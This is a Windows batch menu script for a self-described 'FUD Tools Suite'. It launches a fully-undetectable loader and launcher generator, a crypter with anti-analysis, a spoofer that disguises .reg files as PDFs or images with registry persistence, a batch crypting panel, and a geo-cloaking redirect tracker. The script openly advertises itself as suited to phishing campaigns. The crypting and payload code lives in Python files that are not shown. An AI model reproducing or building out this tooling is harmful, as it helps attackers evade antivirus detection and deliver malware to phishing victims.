@echo off
:MENU
cls
echo ============================================================
echo          FUD TOOLS SUITE - MAIN MENU
echo ============================================================
echo.
echo [1] FUD Loader Generator
echo [2] FUD Launcher Generator
echo [3] FUD Crypter
echo [4] Registry File Spoofer
echo [5] Auto-Crypt Panel (Web Interface)
echo [6] Cloaking + Redirect Tracker (Web Interface)
echo.
echo [7] Install/Update Dependencies
echo [8] View Documentation
echo [9] Exit
echo.
echo ============================================================
set /p choice="Select option (1-9): "

if "%choice%"=="1" goto LOADER
if "%choice%"=="2" goto LAUNCHER
if "%choice%"=="3" goto CRYPTER
if "%choice%"=="4" goto SPOOFER
if "%choice%"=="5" goto PANEL
if "%choice%"=="6" goto TRACKER
if "%choice%"=="7" goto INSTALL
if "%choice%"=="8" goto DOCS
if "%choice%"=="9" goto EXIT
goto MENU

:LOADER
cls
echo ============================================================
echo FUD Loader Generator
echo ============================================================
echo.
echo Formats: .exe, .msi
echo Features: Runtime FUD, Scan FUD, Chrome Compatible
echo.
set /p payload="Enter payload path: "
if not exist "%payload%" (
    echo [!] File not found!
    pause
    goto MENU
)
echo.
echo Select format:
echo [1] EXE
echo [2] MSI
echo [3] Both
set /p fmt="Choice: "

if "%fmt%"=="1" python fud_loader.py "%payload%" exe
if "%fmt%"=="2" python fud_loader.py "%payload%" msi
if "%fmt%"=="3" python fud_loader.py "%payload%" both

echo.
pause
goto MENU

:LAUNCHER
cls
echo ============================================================
echo FUD Launcher Generator
echo ============================================================
echo.
echo Formats: .msi, .msix, .url, .lnk, .exe
echo Perfect for phishing campaigns
echo.
set /p url="Enter payload URL: "
echo.
echo Select format:
echo [1] LNK (Email attachment)
echo [2] URL (One-click)
echo [3] EXE (Download)
echo [4] MSI (Installer)
echo [5] MSIX (Modern app)
echo [6] Complete Kit (All formats)
set /p fmt="Choice: "

if "%fmt%"=="1" python fud_launcher.py "%url%" lnk
if "%fmt%"=="2" python fud_launcher.py "%url%" url
if "%fmt%"=="3" python fud_launcher.py "%url%" exe
if "%fmt%"=="4" python fud_launcher.py "%url%" msi
if "%fmt%"=="5" python fud_launcher.py "%url%" msix
if "%fmt%"=="6" python fud_launcher.py "%url%" kit

echo.
pause
goto MENU

:CRYPTER
cls
echo ============================================================
echo FUD Crypter
echo ============================================================
echo.
echo Multi-layer encryption with anti-analysis
echo.
set /p payload="Enter file to crypt: "
if not exist "%payload%" (
    echo [!] File not found!
    pause
    goto MENU
)
echo.
echo Select output format:
echo [1] EXE
echo [2] MSI
echo [3] MSIX
set /p fmt="Choice: "

if "%fmt%"=="1" python fud_crypter.py "%payload%" exe
if "%fmt%"=="2" python fud_crypter.py "%payload%" msi
if "%fmt%"=="3" python fud_crypter.py "%payload%" msix

echo.
pause
goto MENU

:SPOOFER
cls
echo ============================================================
echo Registry File Spoofer
echo ============================================================
echo.
echo Disguise .reg as PDF, TXT, PNG, MP4
echo Custom pop-ups and registry persistence
echo.
set /p payload="Enter payload path: "
if not exist "%payload%" (
    echo [!] File not found!
    pause
    goto MENU
)
echo.
echo Select format to spoof:
echo [1] PDF
echo [2] TXT
echo [3] PNG
echo [4] MP4
set /p fmt="Choice: "

set format=pdf
if "%fmt%"=="1" set format=pdf
if "%fmt%"=="2" set format=txt
if "%fmt%"=="3" set format=png
if "%fmt%"=="4" set format=mp4

echo.
set /p title="Pop-up title (or press Enter for default): "
set /p message="Pop-up message (or press Enter for default): "
set /p warning="Warning message (or press Enter for default): "

if "%title%"=="" (
    python reg_spoofer.py "%payload%" %format%
) else (
    python reg_spoofer.py "%payload%" %format% --title "%title%" --message "%message%" --warning "%warning%"
)

echo.
pause
goto MENU

:PANEL
cls
echo ============================================================
echo Auto-Crypt Panel
echo ============================================================
echo.
echo Starting web interface on http://localhost:5001
echo.
echo Features:
echo - Batch file processing
echo - API endpoints
echo - Real-time stats
echo - FUD scoring
echo.
echo Press Ctrl+C to stop
echo.
python crypt_panel.py
pause
goto MENU

:TRACKER
cls
echo ============================================================
echo Cloaking + Redirect Tracker
echo ============================================================
echo.
echo Starting web interface on http://localhost:5002
echo.
echo Features:
echo - Geo/IP cloaking
echo - Click tracking
echo - Bot filtering
echo - Telegram notifications
echo.
echo Configure Telegram bot token in cloaking_tracker.py
echo.
echo Press Ctrl+C to stop
echo.
python cloaking_tracker.py
pause
goto MENU

:INSTALL
cls
echo ============================================================
echo Install/Update Dependencies
echo ============================================================
echo.
call INSTALL.bat
pause
goto MENU

:DOCS
cls
echo ============================================================
echo Documentation
echo ============================================================
echo.
type README.md | more
echo.
pause
goto MENU

:EXIT
cls
echo.
echo Thanks for using FUD Tools Suite!
echo.
exit /b 0
